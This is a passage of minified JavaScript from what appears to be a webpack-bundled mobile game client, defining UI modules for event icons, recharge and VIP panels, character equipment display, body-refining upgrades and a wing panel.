0!=this.actID?(this.datas=o.Activity.ins().activityData[this.actID],this.descType=0,this.isZh=!0,this.giftPackTime=n.DateUtils.formatMiniDateTime(this.datas.hongbaoEndTime),this.descType=this.giftPackTime,!0):(this.descType=0,!1)},e}(a.PayfunIconData);e.OSATarget38Rule=r,window.OSATarget38Rule=r,__reflect(r.prototype,"OSATarget38Rule",[]),window.OSATarget38Rule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OnlineTimeAwardRule=void 0;var n=i(17),o=i(142),s=i(534),a=i(41),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([o.OtherCT.ins().updateOnlineAwardResult,n.RedPointBaseSys.ins().RpChange]),i}return __extends(e,t),e.prototype.checkShow=function(){return this.redPoint=o.OtherCT.ins().onlineAwardRed.v,!o.OtherCT.ins().isGetAll()},e.prototype.tapEvt=function(){win.open(s.OnlineTimeAwardWin)},e}(a.PayfunIconData);e.OnlineTimeAwardRule=r,window.OnlineTimeAwardRule=r,__reflect(r.prototype,"OnlineTimeAwardRule",[]),window.OnlineTimeAwardRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QiyuBossRule=void 0;var n=i(20),o=i(233),s=i(35),a=i(41),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([s.TaskCT.ins().postQiyuBossIfo,Ts.enterScene.enterOK]),i}return __extends(e,t),e.prototype.checkShow=function(){var t=s.TaskCT.ins().checkQiyuBossOpen();return!t||n.GameMap.checkIsInQiyuBoss()?(win.close(o.QiyuBossWin),!1):!0},e.prototype.tapEvt=function(){n.GameMap.checkIsKf()||win.open(o.QiyuBossWin)},e}(a.PayfunIconData);e.QiyuBossRule=r,window.QiyuBossRule=r,__reflect(r.prototype,"QiyuBossRule",[]),window.QiyuBossRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShouchongRule=void 0;var n=i(17),o=i(20),s=i(391),a=i(25),r=i(41),l=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([a.Recharge.ins().getRecharge1WinInfo,o.GameMap.postFbType,n.RedPointBaseSys.ins().RpChange]),i}return __extends(e,t),e.prototype.checkShow=function(){return this.redPoint=a.Recharge.ins().rpRecharge1.v,!window.platform.isshen()&&a.Recharge.ins().Recharge1WinisOpen()},e.prototype.tapEvt=function(){win.open(s.FirstChargeNew)},e}(r.PayfunIconData);e.ShouchongRule=l,window.ShouchongRule=l,__reflect(l.prototype,"ShouchongRule",[]),window.ShouchongRule=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixTrailRule=void 0;var n=i(20),o=i(79),s=i(265),a=i(41),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([o.SixReisCT.ins().updateMap,o.SixReisCT.ins().exitTeamBack]),i}return __extends(e,t),e.prototype.checkShow=function(){var t=o.SixReisCT.ins().tfMembers.length>0&&o.SixReisCT.ins().formatStrTimeToArr();return t&&(this.descType=gettext("组队中")),t},e.prototype.tapEvt=function(){n.GameMap.checkIsKf()||win.open(s.SixreincarnationsWin)},e}(a.PayfunIconData);e.SixTrailRule=r,window.SixTrailRule=r,__reflect(r.prototype,"SixTrailRule",[]),window.SixTrailRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StardomainTeamRule=void 0;var n=i(83),o=i(191),s=i(41),a=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([n.StardomainCT.ins().roomMemberInfoBack,n.StardomainCT.ins().exitRoomBack,n.StardomainCT.ins().postRoomChange,Ts.enterScene.enterOK]),i}return __extends(e,t),e.prototype.checkShow=function(){this.descType=gettext("组队中");var t=n.StardomainCT.ins().checkShowEnter();return t},e.prototype.tapEvt=function(){n.StardomainCT.ins().checkMeIsLeader()?win.open(o.StardomainRoomView,1):win.open(o.StardomainRoomView)},e}(s.PayfunIconData);e.StardomainTeamRule=a,window.StardomainTeamRule=a,__reflect(a.prototype,"StardomainTeamRule",[]),window.StardomainTeamRule=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.VipIconRule=void 0;var n=i(17),o=i(15),s=i(12),a=i(25),r=i(41),l=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([a.Recharge.ins().getRecharge1WinInfo,a.Recharge.ins().onNewSvipInfo,n.RedPointBaseSys.ins().RpChange]),i}return __extends(e,t),e.prototype.checkShow=function(){return this.redPoint=a.Recharge.ins().rpSvip.v,!window.platform.isshen()&&s.OpenSystem.ins().checkSysOpen(o.SystemType.SVip)&&s.OpenSystem.ins().checkSysOpen(o.SystemType.Vip)&&!a.Recharge.ins().isSvipActed},e.prototype.tapEvt=function(){win.open("RechargeShowWin",2)},e}(r.PayfunIconData);e.VipIconRule=l,window.VipIconRule=l,__reflect(l.prototype,"VipIconRule",[]),window.VipIconRule=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WxGameShareRule=void 0;var n=i(15),o=i(20),s=i(12),a=i(530),r=i(41),l=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([o.GameMap.postFbType]),i}return __extends(e,t),e.prototype.checkShow=function(){return s.OpenSystem.ins().checkSysOpen(n.SystemType.WXGAMESHARE)},e.prototype.checkShowRedPoint=function(){return 1},e.prototype.tapEvt=function(){win.open(a.WxGameShareWin)},e}(r.PayfunIconData);e.WxGameShareRule=l,window.WxGameShareRule=l,__reflect(l.prototype,"WxGameShareRule",[]),window.WxGameShareRule=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.celebrationIcon2Rule=void 0;var n=i(17),o=i(15),s=i(9),a=i(56),r=i(84),l=i(170),h=i(12),u=i(2),p=i(41),d=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([s.Activity.ins().postActivityIsGetAwards,n.RedPointBaseSys.ins().RpChange]),i}return __extends(e,t),e.prototype.checkShow=function(){return this.redPoint=this.actRp(),this.bolOpen()},e.prototype.tapEvt=function(){this.bolOpen()?win.open(l.QingDianMainWin2,0,a.Activity1002PageStyle.Activity1002):u.TipsCT.ins().showTips(gettext("活动未开启"))},e.prototype.bolOpen=function(){var t=!window.platform.isshen()&&h.OpenSystem.ins().checkSysOpen(o.SystemType.Celebration2)&&r.FuLiCT.ins().isHasFuliActivity(a.Activity1002PageStyle);return t},e.prototype.actRp=function(){var t,e=s.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(a.Activity1002PageStyle.Activity1002==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},e}(p.PayfunIconData);e.celebrationIcon2Rule=d,window.celebrationIcon2Rule=d,__reflect(d.prototype,"celebrationIcon2Rule",[]),window.celebrationIcon2Rule=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.celebrationIcon3Rule=void 0;var n=i(17),o=i(15),s=i(9),a=i(56),r=i(84),l=i(170),h=i(12),u=i(2),p=i(41),d=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([s.Activity.ins().postActivityIsGetAwards,n.RedPointBaseSys.ins().RpChange]),i}return __extends(e,t),e.prototype.checkShow=function(){return this.redPoint=this.actRp(),this.bolOpen()},e.prototype.tapEvt=function(){this.bolOpen()?win.open(l.QingDianMainWin2,0,a.Activity1003PageStyle.Activity1003):u.TipsCT.ins().showTips(gettext("活动未开启"))},e.prototype.bolOpen=function(){var t=!window.platform.isshen()&&h.OpenSystem.ins().checkSysOpen(o.SystemType.Celebration3)&&r.FuLiCT.ins().isHasFuliActivity(a.Activity1003PageStyle);return t},e.prototype.actRp=function(){var t,e=s.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(a.Activity1003PageStyle.Activity1003==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},e}(p.PayfunIconData);e.celebrationIcon3Rule=d,window.celebrationIcon3Rule=d,__reflect(d.prototype,"celebrationIcon3Rule",[]),window.celebrationIcon3Rule=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.celebrationIcon4Rule=void 0;var n=i(17),o=i(15),s=i(9),a=i(56),r=i(84),l=i(170),h=i(12),u=i(2),p=i(41),d=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([s.Activity.ins().postActivityIsGetAwards,n.RedPointBaseSys.ins().RpChange]),i}return __extends(e,t),e.prototype.checkShow=function(){return this.redPoint=this.actRp(),this.bolOpen()},e.prototype.tapEvt=function(){this.bolOpen()?win.open(l.QingDianMainWin2,0,a.Activity1004PageStyle.Activity1004):u.TipsCT.ins().showTips(gettext("活动未开启"))},e.prototype.bolOpen=function(){var t=!window.platform.isshen()&&h.OpenSystem.ins().checkSysOpen(o.SystemType.Celebration4)&&r.FuLiCT.ins().isHasFuliActivity(a.Activity1004PageStyle);return t},e.prototype.actRp=function(){var t,e=s.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(a.Activity1004PageStyle.Activity1004==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},e}(p.PayfunIconData);e.celebrationIcon4Rule=d,window.celebrationIcon4Rule=d,__reflect(d.prototype,"celebrationIcon4Rule",[]),window.celebrationIcon4Rule=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.celebrationIconRule=void 0;var n=i(17),o=i(15),s=i(9),a=i(56),r=i(84),l=i(414),h=i(12),u=i(41),p=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([s.Activity.ins().postActivityIsGetAwards,n.RedPointBaseSys.ins().RpChange]),i}return __extends(e,t),e.prototype.checkShow=function(){return this.redPoint=this.actRp(),!window.platform.isshen()&&h.OpenSystem.ins().checkSysOpen(o.SystemType.Celebration)&&r.FuLiCT.ins().isHasFuliActivity(a.Activity1001PageStyle)},e.prototype.tapEvt=function(){win.open(l.QingDianMainWin)},e.prototype.actRp=function(){var t,e=s.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(a.Activity1001PageStyle.Activity1001==o.pageStyle&&(null===(t=o.rp)||void 0===t?void 0:t.v))return!0}return!1},e}(u.PayfunIconData);e.celebrationIconRule=p,window.celebrationIconRule=p,__reflect(p.prototype,"celebrationIconRule",[]),window.celebrationIconRule=p},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StageItem=void 0;var n=i(1),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="NGskin",e.sFont="num_11_fnt",e}return __extends(e,t),e.prototype.addDisplay=function(){this.skin&&(this.eLv.text=this.stages,this.eLv.scaleX=this.eLv.scaleY=this.blScale?this.blScale:1)},Object.defineProperty(e.prototype,"blScale",{get:function(){return this._scale},set:function(t){this._scale=t,this.addDisplay()},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"stages",{get:function(){return this._stage},set:function(t){this._stage=t,this.addDisplay()},enumerable:!1,configurable:!0}),e}(n.BaseView);e.StageItem=o,window.StageItem=o,__reflect(o.prototype,"StageItem",[]),window.StageItem=o},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RRoleInfoPanel=void 0;var n=i(1),o=i(0),s=i(62),a=i(140),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RRoleInfoSkin",e.curRole=0,e.beforeIndex=-1,e.isEquipView=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.init()},e.prototype.init=function(){this.equips=[];for(var t=0;t<s.EquipPos.MAX-12&&this["item"+t];t++)this.equips[t]=this["item"+t],this.equips[t].touchEnabled=!0,this.equips[t].isShowTips(!1)},e.prototype.clear=function(){this.beforeIndex=-1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t&&t[0]&&(this._otherPlayerData=t[0]),this.skin&&(this.addTouchEvent(this.btn1,this.onClick),this.updataEquip(),this.beforeIndex=this.curRole,this.updateShenFu(),this.isEquipView=!0,this.changeEquipView())},e.prototype.updateShenFu=function(){var t=this._otherPlayerData.shenfuLevel||0;this.shenFuItemIcon.data=null;var e=t>0?gettext("神符Lv.{0}",t):"";if(this.shenFuItemIcon.setStr(e),t){var i=o.GlobalConfig.TalismanConfig[t];this.shenFuItemIcon.setItemImg(""),(null===i||void 0===i?void 0:i.eff)&&this.shenFuItemIcon.setItemEff2(i.eff)}else this.shenFuItemIcon.setItemImg("Role_itemsuo")},e.prototype.updataEquip=function(){if(this.skin){var t=this._otherPlayerData.roleData[this.curRole];this.setEquip(t)}},e.prototype.setEquip=function(t){if(t){for(var e=this.equips.length,i=0;e>i;i++){var n=void 0;if(n=22==i||23==i?t.getEquipByIndex(i+12):t.getEquipByIndex(i),t.tempVipLv=this._otherPlayerData.vipLevel,this.equips[i].setModel(t),this.equips[i].setIndex(i),this.equips[i].data=n.item,0==n.item.configID){if(22==i||23==i){var o=i+12;this.equips[i].setItemImg("xb_4"+o%10)}else a.ForgeConst.EQUIP_POS_TO_SUB[i]>=10?a.ForgeConst.EQUIP_POS_TO_SUB[i]>=20?this.equips[i].setItemImg("xb_3"+i%10):this.equips[i].setItemImg("xb_2"+i%10):this.equips[i].setItemImg("xb_1"+a.ForgeConst.EQUIP_POS_TO_SUB[i]);this.equips[i].isShowTips(!1)}else this.equips[i].isShowTips(!0)}this.powLab.text=gettext("战力:{0}",t.power)}},e.prototype.changeEquipView=function(){this.equipGrp1.visible=this.isEquipView,this.equipGrp2.visible=!this.isEquipView,this.btn1.icon=this.isEquipView?"Role_btn2":"Role_btn1"},e.prototype.onClick=function(t){switch(t.currentTarget){case this.btn1:this.isEquipView=!this.isEquipView,this.changeEquipView()}},e}(n.BaseView);e.RRoleInfoPanel=r,window.RRoleInfoPanel=r,__reflect(r.prototype,"RRoleInfoPanel",[]),window.RRoleInfoPanel=r},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n=i(8),o=i(66),s=i(5),a=i(1),r=i(11),l=i(0),h=i(25),u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEndEvent(this.btnRecovery,this.onClick),this.addTouchEndEvent(this.btnWargod,this.onClick),this.addTouchEndEvent(this.btnAd,this.onClick),this.addTouchEndEvent(this.btnAuto,this.onClick),this.lstAdReward.itemRenderer=r.ItemBase,observe(this,this.updateAd,h.Recharge.ins().postAdPrivilege),observe(this,this.updateRecycle,h.Recharge.ins().postRecycle),observe(this,this.updateGodOfWar,h.Recharge.ins().postGodWar),observe(this,this.updateAuto,h.Recharge.ins().postAutoPrivilege);var t=l.GlobalConfig.PrivilegeData;this.lbwargod1.textFlow=s.TextFlowMaker.generateTextFlow(t.Wargod1),this.lbwargod2.textFlow=s.TextFlowMaker.generateTextFlow(t.Wargod2),this.lbwargod3.textFlow=s.TextFlowMaker.generateTextFlow(t.Wargod3),this.lbwargod4.textFlow=s.TextFlowMaker.generateTextFlow(t.Wargod4),this.lbwargod5.textFlow=s.TextFlowMaker.generateTextFlow(t.Wargod5),this.lbrecovery1.textFlow=s.TextFlowMaker.generateTextFlow(t.Recovery1),this.lbrecovery2.textFlow=s.TextFlowMaker.generateTextFlow(t.Recovery2),this.lbrecovery3.textFlow=s.TextFlowMaker.generateTextFlow(t.Recovery3),this.lbrecovery4.textFlow=s.TextFlowMaker.generateTextFlow(t.Recovery4),1!=platform.getAdType()&&this.grp4.parent&&this.grp4.parent.removeChild(this.grp4)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=(l.GlobalConfig.PrivilegeData.privilegeRecycle.rid,l.GlobalConfig.PrivilegeData.privilegeGodOfWar.rid,l.GlobalConfig.PrivilegeData.privilegeAd.award);this.lstAdReward.dataProvider=new eui.ArrayCollection(i),this.updateRecycle(),this.updateGodOfWar(),this.updateAuto(),this.updateAd()},e.prototype.updateAd=function(){var t=l.GlobalConfig.PrivilegeData.privilegeAd.rid;0==h.Recharge.ins().isGotAdPrivilege?(this.btnAd.label=l.GlobalConfig.RechargeConfig[t]?o.PayUtils.getPayUnitStr(l.GlobalConfig.RechargeConfig[t].cash/100,urlParam.payUnit):gettext("购买"),this.btnAd.visible=!0,this.lbGot.visible=!1):(this.btnAd.visible=!1,this.lbGot.visible=!0)},e.prototype.updateRecycle=function(){if(h.Recharge.ins().recycleTime>0)if(h.Recharge.ins().recycleTime<n.DateUtils.SECOND_PER_DAY){this.recLastTime=h.Recharge.ins().recycleTime;var t=n.DateUtils.getFormatBySecond(this.recLastTime,n.DateUtils.TIME_FORMAT_11);this.recTimeValue=t,Timer.start(1e3,-1,this.recTimeFun,this)}else{var t=n.DateUtils.getFormatBySecond(h.Recharge.ins().recycleTime,n.DateUtils.TIME_FORMAT_5,1);this.recTimeValue=t}else this.gwTimeValue=""},e.prototype.updateGodOfWar=function(){if(h.Recharge.ins().godOfWarTime>0)if(h.Recharge.ins().godOfWarTime<n.DateUtils.SECOND_PER_DAY){this.gwLastTime=h.Recharge.ins().godOfWarTime;var t=n.DateUtils.getFormatBySecond(this.gwLastTime,n.DateUtils.TIME_FORMAT_11);this.gwTimeValue=t,Timer.start(1e3,-1,this.gwTimeFun,this)}else{var t=n.DateUtils.getFormatBySecond(h.Recharge.ins().godOfWarTime,n.DateUtils.TIME_FORMAT_5,1);this.gwTimeValue=t}else this.gwTimeValue=""},e.prototype.updateAuto=function(){if(h.Recharge.ins().AutoPrivilegeTime>0)if(h.Recharge.ins().AutoPrivilegeTime<n.DateUtils.SECOND_PER_DAY){this.autoLastTime=h.Recharge.ins().AutoPrivilegeTime;var t=n.DateUtils.getFormatBySecond(this.autoLastTime,n.DateUtils.TIME_FORMAT_11);this.autoTimeValue=t,Timer.start(1e3,-1,this.autoTimeFun,this)}else{var t=n.DateUtils.getFormatBySecond(h.Recharge.ins().AutoPrivilegeTime,n.DateUtils.TIME_FORMAT_5,1);this.autoTimeValue=t}else this.autoTimeValue=""},e.prototype.onClick=function(t){switch(t.currentTarget){case this.btnRecovery:case this.btnWargod:win.open("RechargeTQTip",t.currentTarget.name);break;case this.btnAd:var e=l.GlobalConfig.PrivilegeData.privilegeAd.rid;h.Recharge.ins().sendPayOrder(e);break;case this.btnAuto:win.open("AutoPrivilegeWin")}},e.prototype.recTimeFun=function(){this.recLastTime--;var t=n.DateUtils.getFormatBySecond(this.recLastTime,n.DateUtils.TIME_FORMAT_11);this.recTimeValue=t,this.recLastTime<=0&&Timer.stop(this.recTimeFun,this)},e.prototype.gwTimeFun=function(){this.gwLastTime--;var t=n.DateUtils.getFormatBySecond(this.gwLastTime,n.DateUtils.TIME_FORMAT_11);this.gwTimeValue=t,this.gwLastTime<=0&&Timer.stop(this.gwTimeFun,this)},e.prototype.autoTimeFun=function(){this.autoLastTime--;var t=n.DateUtils.getFormatBySecond(this.autoLastTime,n.DateUtils.TIME_FORMAT_11);this.autoTimeValue=t,this.autoLastTime<=0&&Timer.stop(this.autoTimeFun,this)},e}(a.BaseView);window.PrivilegePanel=u,__reflect(u.prototype,"PrivilegePanel",[]),window.PrivilegePanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RechargePanel=void 0;var n=i(1),o=i(0),s=i(25),a=i(1727),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RechargePanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=a.ChargeItemRenderer,this.listData=new eui.ArrayCollection,this.list.dataProvider=this.listData},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateList,s.Recharge.ins().postUpDataItem),this.updateList()},e.prototype.updateList=function(){var t=urlParam&&urlParam.apptype&&!urlParam.apptype?urlParam.apptype:"m2df",e=o.GlobalConfig.RechargeItemsConfig,i=[];for(var n in e){var s=e[n].appType;(-1!=s.indexOf(t)||void 0==s)&&i.push(e[n])}this.listData.replaceAll(i)},e}(n.BaseView);e.RechargePanel=r,window.RechargePanel=r,__reflect(r.prototype,"RechargePanel",[]),window.RechargePanel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChargeItemRenderer=void 0;var n=i(66),o=i(3),s=i(25),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ChargeItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){this.addTouchEndEvent(this.btnBay,this.onClick);var t=s.Recharge.ins().getCashByRid(this.data.rid)/100;this.pay.text=n.PayUtils.getPayUnitStr(t,urlParam.payUnit);var e=s.Recharge.ins().getOrderByIndex(this.itemIndex+1);this.FirstRechargeGp.visible=this.FirstRechargeGp.includeInLayout=!e,this.lbRecharge.text=gettext("充值获得{0}元宝",this.data.amount),this.lbFirstRecharge.text=gettext("首充额外获得{0}元宝",this.data.sa),this.give.visible=!e},e.prototype.onClick=function(){s.Recharge.ins().sendPayOrder(this.data.rid)},e}(o.BaseItemRender);e.ChargeItemRenderer=a,window.ChargeItemRenderer=a,__reflect(a.prototype,"ChargeItemRenderer",[]),window.ChargeItemRenderer=a},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LianTiPanel=void 0;var n=i(1),o=i(22),s=i(11),a=i(0),r=i(15),l=i(4),h=i(6),u=i(166),p=i(12),d=i(2),c=i(134),f=i(1730),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LianTiPanelSkin",e.showImg=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.xiulianList.itemRenderer=f.LiantiItem,this.xiulianList.dataProvider=this.xiulianListArr=new eui.ArrayCollection,this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.cbImg.visible=!1},e.prototype.addDisplay=function(){observe(this,this.onLianTiUpLevel,c.JingMaiCT.ins().postLianTiUpdate),observe(this,this.onLianTiUpLevel,h.BagCT.ins().postBagVolChange),this.onLianTiUpLevel()},e.prototype.onLianTiUpLevel=function(t){var e=a.GlobalConfig.LiantiTypeConfig,i=[];for(var n in e)i.push(e[n]);var r=c.JingMaiCT.ins().liantiDataList;this.xiulianListArr.replaceAll(r);var u=a.GlobalConfig.LiantiSuitConfig,p=[];for(var n in u)p.push(u[n]);var d=new o.AttributeData,f=p[c.JingMaiCT.ins().getMaxLiantiAtt(!0)],g=f["maxAttrs"+l.ActorCC.jobId][0][0],m=f["maxAttrs"+l.ActorCC.jobId][0][1];d.type=g,d.value=m;var v=o.AttributeData.getAttrValStr(d),y=p[c.JingMaiCT.ins().getMaxLiantiAtt(!1)],C=f["minAttrs"+l.ActorCC.jobId][0][0],T=y["minAttrs"+l.ActorCC.jobId][0][1];d.type=C,d.value=T;var b=o.AttributeData.getAttrValStr(d);this.curAtt.text=gettext("最大等级+")+v+a.GlobalConfig.AttrConfig[g].name+gettext("，最小等级+")+b+a.GlobalConfig.AttrConfig[C].name,this.curHasList.itemRenderer=s.ItemBase,this.curHasList.dataProvider=this.curHasListArr=new eui.ArrayCollection;var w=a.GlobalConfig.LiantiBaseConfig;this.curHasListArr.replaceAll(w.itemIds),this.num1.text=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,w.itemIds[0])+"",this.num2.text=h.BagCT.ins().getBagGoodsCountById(h.BagCT.BAG_TYPE_OTHTER,w.itemIds[1])+"",t&&this.showTween()},e.prototype.showTween=function(){var t=this,e=PoolMgr.create(u.TweenImg);e.source=this.cbImg.source,this.showImg.push(e),e.y=778,e.horizontalCenter=0,this.cbImg.parent.addChild(e),egret.Tween.get(e).to({y:698},1e3).call(function(){var i=t.showImg.indexOf(e);-1!=i&&(t.showImg.splice(i,1),e.parent&&e.parent.removeChild(e),PoolMgr.release(e))})},e.prototype.onClick=function(t){switch(t.target){case this.composeBtn:win.open("LianTiSuitWin");break;case this.blessBtn:win.open("LianTiBlessWin")}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=p.OpenSystem.ins().checkSysOpen(r.SystemType.LianTi);return i||d.TipsCT.ins().showTips(p.OpenSystem.ins().getNoOpenTips(r.SystemType.LianTi)),i},e.prototype.removeDisplay=function(){},e.prototype.updateDown=function(){this.curAtt},e}(n.BaseView);e.LianTiPanel=g,window.LianTiPanel=g,__reflect(g.prototype,"LianTiPanel",[]),window.LianTiPanel=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LiantiItem=void 0;var n=i(16),o=i(19),s=i(42),a=i(5),r=i(3),l=i(22),h=i(0),u=i(39),p=i(4),d=i(6),c=i(59),f=i(2),g=i(63),m=i(134),v=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.dataChanged=function(){if(this.data){t.prototype.dataChanged.call(this),this.serverData=this.data;var e=h.GlobalConfig.LiantiTypeConfig[this.serverData.type],i=h.GlobalConfig.LiantiSuitConfig[this.serverData.lv];this.icon.source=e.icon,this.jie.text=i.level+"",h.GlobalConfig.LiantiSuitConfig[this.serverData.lv+1]||(n.DisplayUtils.removeFromParent(this.boostBtn),this.maxLevel.visible=!0);var o=new l.AttributeData;o.type=e.type,o.value=this.serverData.lv>0?e.values[this.serverData.lv-1]:0;var r=l.AttributeData.getAttrValStr(o),u=l.AttributeData.getAttrStrByType(e.type),p=u;2==u.length&&(p=s.StringUtils.complementByChar(u[0],9)+u[1]),this.att.textFlow=a.TextFlowMaker.generateTextFlow(p+"+"+("|"+r+"|"))}},e.prototype.onClick=function(t){switch(t.target){case this.boostBtn:var e=h.GlobalConfig.LiantiSuitConfig[this.serverData.lv+1],i=0;for(var n in h.GlobalConfig.LiantiSuitConfig)i++;var s=void 0;if(e.expend)for(var n=0;n<e.expend.length;n++)if(s=e.expend[n],s.type==u.ItemType.TYPE_1){var a=d.BagCT.ins().getBagItemById(s.id);if(!a||a.count<s.count)return g.WarnCT.ins().setBuyGoodsWarn(s.id,1,!0),void c.GameFlashSaleCt.ins().reportJMMaterialNot()}else if(s.type==u.ItemType.TYPE_0){var r=p.ActorCC.getCurrencyByType(s.id);if(r<s.count)return f.TipsCT.ins().showTips(o.GlobalFun.getItemName(s.id)+"不足"),void c.GameFlashSaleCt.ins().reportGolaNot()}this.serverData.lv<i-1?m.JingMaiCT.ins().sendLianTiUpLevel(this.serverData.type):f.TipsCT.ins().showTips(gettext("已满级"))}},e}(r.BaseItemRender);e.LiantiItem=v,window.LiantiItem=v,__reflect(v.prototype,"LiantiItem",[]),window.LiantiItem=v},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WingPanel=void 0;var n=i(8),o=i(16),s=i(1),a=i(22),r=i(0),l=i(4),h=i(13),u=i(6),p=i(499),d=i(7),c=i(2),f=i(263),g=i(165),m=i(1733),v=i(99),y=i(65),C=i(600),T=i(199),b=i(1734),w=i(34),I=i(425),_=i(19),S=i(59),x=i(12),D=i(15),A=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._curRole=0,e._lastLv=0,e.currViewNum=0,e.godWingItemList=[],e._sn_="WingSkin",e.lastTimeDown=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.attrList.itemRenderer=C.WingAttrItemRender,this.attrList.dataProvider=this.eArc=new eui.ArrayCollection,this.godWingItemList=[];for(var t=0;t<g.WingEnum.GodWingMaxSlot;t++)this["item"+t].slot=t+1,this.godWingItemList.push(this["item"+t]),this.addTouchEvent(this["item"+t],this.onGodWingItemClick);this.updateGodWingItem(),v.WingCC.initConfig(),this.danItemID=r.GlobalConfig.WingCommonConfig.levelItemid,this.addTouchEvent(this,this.onTap),this.addTouchEvent(this.pasSkill,this.skillClick),this.addTouchEvent(this.gwSkill,this.skillClick),this.addTouchEvent(this.btnHelp,this.onHelpTap),this.addTouchEvent(this.txt_decomp0,this.onDecomClick),this.checkBoxs.selected=!1,this.checkBoxs.visible=!1,this.curRole=this.curRole},e.prototype.onGodWingItemClick=function(t){var e=t.currentTarget;if(e.data){var i=r.GlobalConfig.GodWingItemConfig[e.data.itemId];win.open("GodWingEquipTipsWin",i)}else win.open(T.GodWingChangePanel,[e.slot])},e.prototype.updateGodWingItem=function(){for(var t=v.WingCC.getGodWing(this.curRole),e=(t.getData(),0),i=this.godWingItemList;e<i.length;e++){var n=i[e],o=n.slot;n.setCountVisible(!1);var s=v.WingCC.getCurLevelItemId(0,o);n.data=s;var 